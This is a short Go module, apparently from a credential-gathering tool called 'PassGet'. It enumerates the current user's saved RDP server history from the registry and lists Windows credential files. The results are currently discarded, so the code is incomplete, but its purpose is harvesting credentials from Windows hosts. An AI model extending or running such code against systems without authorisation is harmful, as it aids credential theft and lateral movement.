package rdp

import (
	"PassGet/modules/utils"
	"golang.org/x/sys/windows/registry"
)

func Get() error {
	Hosts, err := GetHistoryHost()
	if err != nil {
		return err
	}
	_ = Hosts
	CredentialFiles := GetCredentialFiles()
	_ = CredentialFiles
	return nil
}
func GetHistoryHost() ([]string, error) {
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Terminal Server Client\Servers`, registry.ENUMERATE_SUB_KEYS|registry.QUERY_VALUE)
	if err != nil {
		return nil, err
	}
	defer k.Close()

	// 读取字符串值
	Keys, err := k.ReadSubKeyNames(0)
	if err != nil {
		return nil, err
	}
	Hosts := make([]string, 0)
	for _, key := range Keys {
		Hosts = append(Hosts, key)
	}
	return Hosts, nil
}
func GetCredentialFiles() []string {
	files, _, err := utils.ListFilesAndDirs(utils.WindowsCredentials)
	if err != nil {
		return nil
	}
	CredentialFiles := make([]string, 0)
	for _, file := range files {
		CredentialFiles = append(CredentialFiles, file)
	}
	return CredentialFiles
}
